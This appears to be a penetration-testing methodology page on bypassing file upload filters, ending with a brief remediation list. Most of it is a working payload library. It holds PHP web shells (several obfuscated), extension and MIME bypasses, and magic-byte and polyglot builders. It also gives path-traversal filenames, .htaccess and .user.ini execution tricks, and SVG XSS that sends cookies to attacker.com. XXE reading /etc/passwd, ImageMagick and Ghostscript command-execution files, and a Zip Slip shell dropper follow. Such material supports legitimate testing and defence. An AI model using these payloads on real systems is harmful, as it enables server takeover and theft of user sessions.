---
title: "File Upload Bypass"
date: 2026-02-24
draft: false
---

# File Upload Bypass

> **Severity**: Critical | **CWE**: CWE-434
> **OWASP**: A03:2021 – Injection / A04:2021 – Insecure Design

---

## What Is File Upload Bypass?

File upload vulnerabilities occur when an application accepts user-uploaded files without adequate validation, allowing attackers to upload and execute malicious code or access sensitive files. The attack impact scales from stored XSS to full server compromise depending on execution context.

```
Upload Vector → Bypass Filter → Store File → Trigger Execution
     ↑                ↑               ↑              ↑
  multipart        extension      web root,      direct access,
  PUT API          MIME type      readable       LFI include,
  avatar           content sig    path           image proc,
  import           size           predictable    PHAR trigger
```

---

## Discovery Checklist

**Phase 1 — Enumeration**
- [ ] Find all upload endpoints (avatar, import, attachment, profile pic, documents)
- [ ] Check accepted file types in UI/response messages
- [ ] Check where uploaded files are stored (URL, path in response)
- [ ] Determine if uploaded files are served from same domain (XSS scope)
- [ ] Check if file is stored with original name vs renamed/hashed

**Phase 2 — Filter Identification**
- [ ] Upload PHP file — error message reveals what's filtered
- [ ] Upload file with double extension (`.php.jpg`) — observe behavior
- [ ] Check if filtering is client-side only (JS validation)
- [ ] Check Content-Type validation (MIME type sniffing or header check?)
- [ ] Check magic bytes validation (file signature)
- [ ] Check file size limits, dimensions (for images)
- [ ] Determine server-side language (PHP, ASP.NET, JSP, Node)

**Phase 3 — Exploitation**
- [ ] Test all extension bypasses below
- [ ] Test content-type spoofing
- [ ] Test magic bytes prepend
- [ ] Test polyglot files (valid image + PHP code)
- [ ] Check for path traversal in filename
- [ ] Test null byte in filename
- [ ] Test very long filenames (truncation)
- [ ] Check for SSRF/PHAR/XXE via special file types

---

## Payload Library

### Bypass 1 — Extension Obfuscation

```bash
# PHP execution alternatives (depends on server config):
shell.php
shell.php3        # PHP 3 legacy
shell.php4        # PHP 4 legacy
shell.php5        # PHP 5
shell.php7        # PHP 7
shell.phtml       # PHP HTML template
shell.phar        # PHP Archive
shell.shtml       # Server-side includes
shell.inc         # PHP include files

# ASP.NET execution alternatives:
shell.asp
shell.aspx
shell.ashx        # Generic handler
shell.asmx        # Web service
shell.cshtml      # Razor view
shell.vbhtml      # VB Razor

# JSP execution alternatives:
shell.jsp
shell.jspx        # JSP XML

# Case variation bypass:
shell.PHP
shell.Php
shell.pHp
shell.PHP5
shell.PhP3

# Double extension (if server processes last extension):
shell.php.jpg     # → serves as JPEG but .php may be processed
shell.jpg.php     # → .php as final extension
shell.png.php5
shell.php.png     # Apache mod_mime: if .php handler set, dual-ext may execute

# Multiple extensions + Apache config:
shell.php.jpg.php
shell.php.xxxPHP

# Space and dot bypass:
"shell.php "      # trailing space (Windows)
"shell.php."      # trailing dot (Windows filesystem strips it)
"shell.php....."
"shell.php%20"    # URL-encoded space in filename

# Null byte bypass (historic, PHP < 5.3.4):
shell.php%00.jpg  # null byte truncates → stored as shell.php
shell.php\x00.jpg

# Semicolon (IIS legacy):
shell.php;.jpg    # IIS processes up to semicolon → shell.php

# Overlong Unicode / encoding:
shell%2Ephp       # URL decode → shell.php
shell.ph%70       # p → shell.php
shell%252Ephp     # double URL encode

# Right-to-left override (RTLO) in filename:
# Unicode U+202E reverses display order
# Filename: "shell[RTLO]php.jpg" → displays as "shelljpg.php"
# Bypasses human review, not automated filters
```

### Bypass 2 — Content-Type Spoofing

```bash
# Change Content-Type in multipart upload to allowed type:
# Original malicious upload:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# Spoofed Content-Type:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    ← lie about content type

Content-Type: image/png
Content-Type: image/gif
Content-Type: application/pdf
Content-Type: text/plain

# curl with spoofed content type:
curl -X POST https://target.com/upload \
  -F "file=@shell.php;type=image/jpeg" \
  -b "session=VALID_SESSION"
```

### Bypass 3 — Magic Bytes Prepend (File Signature Spoofing)

```bash
# Many filters check first bytes (magic number) not extension

# Add image magic bytes to PHP webshell:
# GIF header: GIF89a
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php.gif
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif

# JPEG header (FF D8 FF):
printf '\xff\xd8\xff\xe0<?php system($_GET["cmd"]); ?>' > shell.php

# PNG header (89 50 4E 47 0D 0A 1A 0A):
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php

# PDF header:
printf '%%PDF-1.5\n<?php system($_GET["cmd"]); ?>' > shell.pdf.php

# PHP in EXIF data (bypass getimagesize):
# exiftool injection into legitimate image:
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg
mv legitimate.jpg shell.php.jpg
# If server uses getimagesize() only → passes check; stores with .php extension

# Using exiftool for code in metadata:
exiftool -DocumentName='<?php echo shell_exec($_GET["e"]); ?>' img.png
cp img.png shell.php
```

### Bypass 4 — Polyglot Files

```bash
# JPEG polyglot — valid JPEG AND PHP file:
# Insert PHP code into JPEG Comment segment (FF FE):
python3 -c "
with open('photo.jpg', 'rb') as f:
    data = f.read()
# Insert PHP after SOI marker:
php_code = b'<?php system(\$_GET[\"cmd\"]); ?>'
# Find comment segment or just prepend after FF D8:
output = data[:2] + b'\xff\xfe' + len(php_code).to_bytes(2, 'big') + php_code + data[2:]
with open('polyglot.php.jpg', 'wb') as f:
    f.write(output)
"

# GIF polyglot (simplest):
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.php.gif

# PDF polyglot:
# PDF structure with embedded PHP — survives some PDF parsers

# SWF/Flash polyglot (legacy):
# Valid SWF header + PHP code in body

# ZIP polyglot (affects ZIP-based formats like DOCX, XLSX):
# Create valid ZIP, append PHP after end-of-central-directory
# PHP reads from beginning, ZIP readers from end
cat shell.php valid.zip > polyglot.php.zip
```

### Bypass 5 — Path Traversal in Filename

```bash
# If server uses original filename to store file:
# Traverse out of upload directory:

# In filename field (URL-decoded):
filename="../../../var/www/html/shell.php"
filename="..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fshell.php"
filename="....//....//....//var/www/html/shell.php"  # normalized double dot

# Windows:
filename="..\..\..\inetpub\wwwroot\shell.aspx"
filename="..%5C..%5C..%5Cinetpub%5Cwwwroot%5Cshell.aspx"

# Burp payload for filename:
../shell.php
..%2Fshell.php
..%252Fshell.php
%2e%2e%2fshell.php
%2e%2e/shell.php
....//shell.php

# In multipart Content-Disposition:
Content-Disposition: form-data; name="file"; filename="../shell.php"
Content-Disposition: form-data; name="file"; filename="..%2Fshell.php"
```

### Bypass 6 — PHP Web Shell Payloads

```php
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["e"]); ?>
<?php passthru($_REQUEST["c"]); ?>
<?php eval($_POST["code"]); ?>
<?php $cmd=$_GET["c"];$output=array();exec($cmd,$output);echo implode("\n",$output); ?>

// Short tags (if short_open_tag=On):
<? system($_GET["c"]); ?>
<?= system($_GET["c"]); ?>

// Alternative if "system" is blocked:
<?php echo `{$_GET["c"]}`; ?>      // backtick operator
<?php preg_replace('/.*/e', $_POST["c"], ''); ?>  // preg_replace /e (PHP<7)
<?php assert($_POST["c"]); ?>
<?php call_user_func($_GET["f"], $_GET["c"]); ?>
<?php $f=$_GET["f"];$f($_GET["c"]); ?>

// Obfuscated (if keyword filtered):
<?php $s="sys"."tem";$s($_GET["c"]); ?>
<?php $x=base64_decode("c3lzdGVt");$x($_GET["c"]); ?>  // system
<?php ($_=@$_GET['c']).@$_(0); ?>

// .htaccess upload — force PHP execution:
// Upload .htaccess with:
AddType application/x-httpd-php .jpg
// Then upload shell.jpg → executes as PHP

// .user.ini upload (PHP-FPM / CGI mode):
// Upload .user.ini with:
auto_prepend_file=shell.jpg
// Then upload shell.jpg with PHP code → prepended to every PHP file in dir
```

### Bypass 7 — SVG XSS (Same-Origin Stored XSS)

```xml
<!-- Upload as profile_picture.svg or avatar.svg -->
<!-- If served from same domain → stored XSS -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<!-- More robust SVG XSS: -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <circle cx="50" cy="50" r="50"/>
</svg>

<!-- SVG with external script: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="x" onerror="fetch('https://attacker.com/c?'+document.cookie)"/>
</svg>

<!-- SVG SSRF: -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://COLLABORATOR_ID.oast.pro/test"/>
</svg>
```

### Bypass 8 — XXE via File Formats (Office/XML)

```bash
# DOCX/XLSX/PPTX are ZIP files — inject XXE in XML content:

# Create malicious DOCX:
mkdir -p docx_xxe/word
cat > docx_xxe/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>
EOF
# Zip to create DOCX:
cd docx_xxe && zip -r ../evil.docx . && cd ..

# For blind XXE exfiltration via DOCX import feature:
# Use OOB DTD with collaborator URL
cat > docx_xxe/word/document.xml << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_ID.oast.pro/evil.dtd">
  %xxe;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
<w:body><w:p><w:r><w:t>test</w:t></w:r></w:p></w:body></w:document>
EOF
```

### Bypass 9 — ImageMagick / GraphicsMagick RCE

```bash
# ImageMagick "ImageTragick" — if server processes uploaded images:

# Malicious SVG for SSRF/RCE via ImageMagick:
cat > exploit.svg << 'EOF'
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
 "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="https://COLLABORATOR_ID.oast.pro/test" x="0" y="0" height="10px" width="10px"/>
</svg>
EOF

# MSL/MVG injection (if ImageMagick converts):
cat > exploit.mvg << 'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://COLLABORATOR_ID.oast.pro/"|id > /tmp/pwned")'
pop graphic-context
EOF

# Malicious filename with backtick (ImageMagick < 6.9.3-9):
# Upload file named: $(id > /tmp/pwned).jpg
# Or: `id > /tmp/pwned`.jpg

# GhostScript RCE (PDF processing):
cat > exploit.pdf << 'EOF'
%!PS-Adobe-3.0
%%BoundingBox: 0 0 100 100
/exec {system} def
(id > /tmp/gs_rce) exec
EOF
```

### Bypass 10 — Zip Slip (Archive Extraction)

```python
# Create malicious ZIP that extracts webshell to web root:
import zipfile
import os

def create_zip_slip(output_zip, target_path, shell_content):
    """Create malicious ZIP that overwrites files via path traversal"""
    with zipfile.ZipFile(output_zip, 'w') as zf:
        # Create traversal path
        zf.writestr(target_path, shell_content)

# Target web shell path:
create_zip_slip(
    "exploit.zip",
    "../../../../var/www/html/shell.php",
    "<?php system($_GET['cmd']); ?>"
)

# Multiple payloads in one ZIP:
with zipfile.ZipFile("multi.zip", "w") as zf:
    zf.writestr("../shell.php", "<?php system($_GET['cmd']); ?>")
    zf.writestr("../../shell.php", "<?php system($_GET['cmd']); ?>")
    zf.writestr("../../../shell.php", "<?php system($_GET['cmd']); ?>")
    zf.writestr("legit.txt", "This is a legitimate file")
```

---

## Tools

```bash
# Upload_bypass — automated file upload testing:
git clone https://github.com/sAjibuu/Upload_Bypass
python3 upload_bypass.py -u https://target.com/upload -f shell.php

# fuxploider — file upload vulnerability scanner:
git clone https://github.com/almandin/fuxploider
python3 fuxploider.py --url https://target.com/upload --cookies "session=VALUE"

# Burp Suite:
# - Upload file → Intruder on filename/content-type
# - Extensions: Upload Scanner BApp
# - Intruder payloads: extension list from SecLists

# exiftool — embed code in EXIF metadata:
exiftool -Comment='<?php system($_GET["c"]); ?>' image.jpg -o shell.php.jpg

# Polyglot creation:
printf 'GIF89a<?php system($_GET["c"]); ?>' > poly.php.gif

# SecLists — file upload payload lists:
# /usr/share/seclists/Fuzzing/Extensions/
ls /usr/share/seclists/Fuzzing/Extensions/

# Check if file execution is possible after upload:
curl https://target.com/uploads/shell.php?cmd=id
curl https://target.com/uploads/shell.php.gif?cmd=id

# Test .htaccess upload:
echo 'AddType application/x-httpd-php .gif' > .htaccess
curl -X POST https://target.com/upload -F "file=@.htaccess" -b "session=VAL"
```

---

## Remediation Reference

- **Allowlist file extensions** server-side — not blocklist (blocklists are incomplete)
- **Rename files** on upload — generate UUID-based names, strip original extension from stored name
- **Store uploads outside web root** — serve via a controller, not direct URL
- **Check magic bytes AND extension**: neither alone is sufficient
- **Strip EXIF/metadata**: use ImageMagick's `convert -strip` before storing
- **Serve uploads from separate domain**: `static.company.com` — prevents XSS from same-origin execution
- **Disable PHP execution** in upload directory via `.htaccess`: `php_flag engine off`
- **Validate file dimensions** for images — confirms image integrity
- **Limit file size, type, and quantity** per upload endpoint
- **Scan uploads** with AV/malware scanning before making accessible

*Part of the Web Application Penetration Testing Methodology series.*
